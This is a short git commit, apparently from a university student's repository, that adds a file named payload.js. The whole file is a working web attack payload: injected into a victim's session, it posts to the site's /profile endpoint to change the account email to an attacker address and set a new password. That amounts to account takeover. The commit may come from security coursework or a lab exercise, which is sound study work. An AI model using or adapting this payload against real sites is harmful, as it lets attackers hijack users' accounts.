875b37207c9b4cd35bab00039942f412bab575f1
mbas0043 <mbas0043@student.monash.edu>
2026-09-18 17:08:15 +1000

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,10 @@
+const data = new URLSearchParams({
+  email: "attacker@example.test",
+  password: "new-password-123"
+});
+
+fetch("/profile", {
+  method: "POST",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: data.toString()
+});
